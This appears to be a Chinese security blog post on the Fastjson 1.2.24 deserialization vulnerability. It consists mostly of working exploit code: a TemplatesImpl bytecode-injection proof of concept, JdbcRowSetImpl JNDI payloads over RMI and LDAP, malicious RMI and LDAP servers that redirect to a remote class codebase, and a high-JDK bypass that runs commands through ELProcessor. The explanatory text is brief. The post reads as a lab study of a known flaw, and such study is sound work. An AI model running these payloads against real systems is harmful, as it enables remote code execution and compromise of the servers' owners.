# FastJson 1.2.24版本漏洞分析


&lt;!--more--&gt;
## 0x01环境
`jdk8u65`，最好是低一点的版本，因为有一条jndi的链子。
`Maven 3.6`
`1.2.22&lt;=Fastjson&lt;=1.2.24`
`pom.xml`
```xml
&lt;dependency&gt;
    &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
    &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
    &lt;version&gt;4.0.9&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;commons-io&lt;/groupId&gt;
    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
    &lt;version&gt;2.5&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
    &lt;version&gt;1.2.24&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;commons-codec&lt;/groupId&gt;
    &lt;artifactId&gt;commons-codec&lt;/artifactId&gt;
    &lt;version&gt;1.12&lt;/version&gt;
&lt;/dependency&gt;
```
这里有两条攻击链子，一条是基于`TemplatesImpl`的链子，另一条是基于`JdbcRowSetImpl`的链子。
## 0x02  TemplatesImpl Exp
```java
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.Feature;  
import com.alibaba.fastjson.parser.ParserConfig;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import org.apache.commons.codec.binary.Base64;  
import org.apache.commons.io.IOUtils;  
  
import java.io.ByteArrayOutputStream;  
import java.io.File;  
import java.io.FileInputStream;  
import java.io.IOException;  
  
// TemplatesImpl 链子的 EXPpublic class TemplatesImplPoc {  
    public static String readClass(String cls){  
        ByteArrayOutputStream bos = new ByteArrayOutputStream();  
        try {  
            IOUtils.copy(new FileInputStream(new File(cls)), bos);  
        } catch (IOException e) {  
            e.printStackTrace();  
        }  
        return Base64.encodeBase64String(bos.toByteArray());  
    }  
  
    public static void main(String args[]){  
        try {  
            ParserConfig config = new ParserConfig();  
            final String fileSeparator = System.getProperty(&#34;file.separator&#34;);  
            final String evilClassPath = &#34;/Users/f10wers13eicheng/Desktop/JavaSecuritytalk/spring/FastJson/src/main/java/TemplatesImpl.class&#34;;  
            String evilCode = readClass(evilClassPath);  
            final String NASTY_CLASS = &#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;;  
            String text1 = &#34;{\&#34;@type\&#34;:\&#34;&#34; &#43; NASTY_CLASS &#43;  
                    &#34;\&#34;,\&#34;_bytecodes\&#34;:[\&#34;&#34;&#43;evilCode&#43;&#34;\&#34;],&#39;_name&#39;:&#39;Drunkbaby&#39;,&#39;_tfactory&#39;:{ },\&#34;_outputProperties\&#34;:{ },&#34;;  
            System.out.println(text1);  
  
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  
        } catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
}
```
## 0x03 JdbcRowSetImpl的利用链
基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI&#43;RMI和JNDI&#43;LDAP，都是属于基于Bean Property类型的JNDI的利用方式。
### JNDI&#43;RMI
这一条链子名为`JdbcRowSetImpl`，
`JdbcRowSetImpl`类里面有一个`setDataSourceName()`方法，一看方法名就知道是什么意思了。设置数据库源，通过这个方式进行攻击。
exp如下
```json
{
	&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,
	&#34;dataSourceName&#34;:&#34;rmi://localhost:1099/Exploit&#34;, &#34;autoCommit&#34;:true
}
```
根据JNDI注入的漏洞利用，需要先起一个`Server`，然后把恶意的类放到`vps`上即可。可以把之前的`Server`复制进来
JNDIRmiServer.java
```java
import javax.naming.InitialContext;  
import javax.naming.Reference;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class JNDIRMIServer {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 Registry registry = LocateRegistry.createRegistry(1099);  
 // RMI  
 //initialContext.rebind(&#34;rmi://localhost:1099/remoteObj&#34;, new RemoteObjImpl()); // JNDI 注入漏洞  
 Reference reference = new Reference(&#34;JndiCalc&#34;,&#34;JndiCalc&#34;,&#34;http://localhost:7777/&#34;);  
 initialContext.rebind(&#34;rmi://localhost:1099/remoteObj&#34;, reference);  
 }  
}
```
攻击的`exp`如下
```java
import com.alibaba.fastjson.JSON;  
  
// 基于 JdbcRowSetImpl 的利用链  
public class JdbcRowSetImplExp {  
    public static void main(String[] args) {  
        String payload = &#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/remoteObj\&#34;, \&#34;autoCommit\&#34;:true}&#34;;  
 JSON.parse(payload);  
 }  
}
```
### JNDI&#43;LDAP
`JNDILdapServer.java`
```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
  
  
// jndi 绕过 jdk8u191 之前的攻击  
public class JNDILdapServer {  
    private static final String LDAP_BASE = &#34;dc=example,dc=com&#34;;  
 public static void main (String[] args) {  
        String url = &#34;http://127.0.0.1:7777/#JndiCalc&#34;;  
 int port = 1099;  
 try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
 config.setListenerConfigs(new InMemoryListenerConfig(  
                    &#34;listen&#34;,  
 InetAddress.getByName(&#34;0.0.0.0&#34;),  
 port,  
 ServerSocketFactory.getDefault(),  
 SocketFactory.getDefault(),  
 (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
 System.out.println(&#34;Listening on 0.0.0.0:&#34; &#43; port);  
 ds.startListening();  
 }  
        catch ( Exception e ) {  
            e.printStackTrace();  
 }  
    }  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
        private URL codebase;  
 /**  
 * */ public OperationInterceptor ( URL cb ) {  
            this.codebase = cb;  
 }  
        /**  
 * {@inheritDoc}  
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
 */ @Override  
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {  
            String base = result.getRequest().getBaseDN();  
 Entry e = new Entry(base);  
 try {  
                sendResult(result, base, e);  
 }  
            catch ( Exception e1 ) {  
                e1.printStackTrace();  
 }  
        }  
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {  
            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#39;.&#39;, &#39;/&#39;).concat(&#34;.class&#34;));  
 System.out.println(&#34;Send LDAP reference result for &#34; &#43; base &#43; &#34; redirecting to &#34; &#43; turl);  
 e.addAttribute(&#34;javaClassName&#34;, &#34;Exploit&#34;);  
 String cbstring = this.codebase.toString();  
 int refPos = cbstring.indexOf(&#39;#&#39;);  
 if ( refPos &gt; 0 ) {  
                cbstring = cbstring.substring(0, refPos);  
 }  
            e.addAttribute(&#34;javaCodeBase&#34;, cbstring);  
 e.addAttribute(&#34;objectClass&#34;, &#34;javaNamingReference&#34;);  
 e.addAttribute(&#34;javaFactory&#34;, this.codebase.getRef());  
 result.sendSearchEntry(e);  
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
 }  
  
    }  
}
```
exp
```java
import com.alibaba.fastjson.JSON;    
    
public class JdbcRowSetImplLdapExp {    
    public static void main(String[] args) {    
        String payload = &#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://localhost:1099/Exploit\&#34;, \&#34;autoCommit\&#34;:true}&#34;;    
 JSON.parse(payload);    
 }    
}
```
## 0x04 Fastjson攻击中jdk高版本绕过
JNDIBypassHighJavaServerEL.java
```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import org.apache.naming.ResourceRef;  
  
import javax.naming.StringRefAddr;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
// JNDI 高版本 jdk 绕过服务端，用 bind 的方式  
public class JNDIBypassHighJavaServerEL {  
    public static void main(String[] args) throws Exception {  
        System.out.println(&#34;[*]Evil RMI Server is Listening on port: 1099&#34;);  
 Registry registry = LocateRegistry.createRegistry(1099);  
  
 // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  
 ResourceRef ref = new ResourceRef(&#34;javax.el.ELProcessor&#34;, null, &#34;&#34;, &#34;&#34;,  
 true,&#34;org.apache.naming.factory.BeanFactory&#34;,null);  
  
 // 强制将&#39;x&#39;属性的setter从&#39;setX&#39;变为&#39;eval&#39;, 详细逻辑见BeanFactory.getObjectInstance代码  
 ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;x=eval&#34;));  
  
 // 利用表达式执行命令  
 ref.add(new StringRefAddr(&#34;x&#34;, &#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;)&#34; &#43;  
                &#34;.newInstance().getEngineByName(\&#34;JavaScript\&#34;)&#34; &#43;  
                &#34;.eval(\&#34;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()\&#34;)&#34;));  
 System.out.println(&#34;[*]Evil command: calc&#34;);  
 ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  
 registry.bind(&#34;Object&#34;, referenceWrapper);  
 }  
}
```
exp
```java
import com.alibaba.fastjson.JSON;  
  
public class HighJdkBypass {  
    public static void main(String[] args) {  
        String payload =&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:1234/ExportObject\&#34;,\&#34;autoCommit\&#34;:\&#34;true\&#34; }&#34;;  
 JSON.parse(payload);  
 }  
}
```


---

> Author: N1Rvana  
> URL: http://localhost:1313/fastjson-1.2.24%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/  

